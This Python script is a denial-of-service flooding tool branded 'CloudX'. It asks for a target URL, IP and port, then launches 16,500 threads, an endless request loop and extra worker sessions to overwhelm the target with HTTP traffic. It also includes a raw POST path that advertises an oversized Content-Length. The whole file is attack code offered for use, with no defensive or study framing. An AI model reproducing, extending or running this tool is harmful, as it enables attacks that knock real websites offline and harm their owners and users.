import threading
import requests
import random
import os
import time
import socket
import ssl
import urllib.request
from urllib.parse import urlparse
import sys

def type(text, delay=0.1):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

def type_with_protocol(url, delay=0.1):
    protocol = "https://" if url.startswith("https://") else "http://"
    url_without_protocol = url[len(protocol):]
    
    sys.stdout.write(protocol)
    sys.stdout.flush()
    time.sleep(delay)

    for char in url_without_protocol:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

os.system('clear')
print("")
logo = """

  _______             ___  __
 / ___/ /__  __ _____/ / |/_/
/ /__/ / _ \/ // / _  />  <  - Sunshine
\___/_/\___/\_,_/\_,_/_/|_|  


"""
print(logo)

# Variables
url = ""
ip = ""
port = ""
threads = ""
method = ""
maxThreads = int(50000)

type("--------------------------")
print("\n")
url = input("[+] Enter a URL to attack: ")
ip = input("[+] Enter the target IP address: ")
port = input("[+] Enter the target port (default: 80): ")
numberOfThreads = input("[+] Enter the desired number of threads (default: 16500) (max: 50000): ")
method = input("[+] Enter 'GET' as the request method (default: GET): ")
print("\n")
type("TARGET:")
type_with_protocol(url)
print("\n")
type("--------------------------")
print("\n")
time.sleep(2.5)
type("Waiting CloudX to connect... || [Workers= 50]")
print("\n")
time.sleep(1.5)

if port == "":
    port = str(80)
if numberOfThreads == "":
    numberOfThreads = int(16500)
if maxThreads < int(numberOfThreads):
    numberOfThreads = int(maxThreads)
if method == "":
    method = "GET"
if method == "POST":
    method = "GET"

# Construct attack parameters
headers = {
'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Connection': 'close'
}

def attack(ip, port, threadNum):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    request = urllib.request.Request(url, None, headers)
    while True:
        try:
            if method == "GET":
                # Send larger packets by repeatedly sending the request
                for _ in range(500):  # Adjust the number of repetitions to increase packet size
                    urlsocket_file = urllib.request.urlopen(request)
                print("[*] Thread (%s) | Attack Sent! [-- CloudX --]" % (threadNum))
            else:
                # Modify the POST request to include larger data
                s.connect((ip, int(port)))
                data = "POST /%s HTTP/1.1\r\nHost: %s\r\nContent-Length: 1000000000\r\n\r\n" % (url, ip)
                s.sendto(data.encode('utf-8'), (ip, int(port)))
                s.close()
                print("[*] Thread (%s) | Attack Sent! [METHOD: POST]" % (threadNum))
        except Exception as e:
            print("[*] Thread (%s) | Error! CloudX can't reach the target URL! Error: %s" % (threadNum, str(e)))
            print("[*] Thread (%s) | Attack stopped." % (threadNum))
            break

def flood_url():
    while True:
        user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36'
        headers['User-Agent'] = user_agent
        request = urllib.request.Request(url, None, headers)
        urllib.request.urlopen(request)

parsed_url = urlparse(url)
if not parsed_url.scheme:
    print("[!] Invalid URL. Please include the scheme (e.g., https://)")
    print("If you believed this is an error, contact us: sunshinexjuhari@protonmail.com")
    sys.exit(1)

def workers(num_workers, requests_per_worker):
    for _ in range(num_workers):
        threading.Thread(target=worker, args=(requests_per_worker,)).start()

def worker(requests_per_worker):
    session = requests.Session()
    session.headers.update(headers)
    for _ in range(requests_per_worker):
        try:
            if method == "GET":
                response = session.get(url)
                time.sleep(0.1)
                print("[*] Worker | Attack Sent! Status Code: %s" % response.status_code)
            else:
                response = session.post(url)
                time.sleep(0.1)
                print("[*] Worker | Attack Sent! Status Code: %s" % response.status_code)
        except requests.RequestException as e:
            print("[*] Worker | Request failed! Error: %s" % str(e))

default_threads = 16500
for i in range(default_threads):
    threading.Thread(target=attack, args=(ip, port, i)).start()
threading.Thread(target=flood_url).start()

num_workers = 50
requests_per_worker = 300

threading.Thread(target=workers, args=(num_workers, requests_per_worker)).start()

# NOTE
"""
CloudX is under development, so don't have high expectations about this. alright?
"""
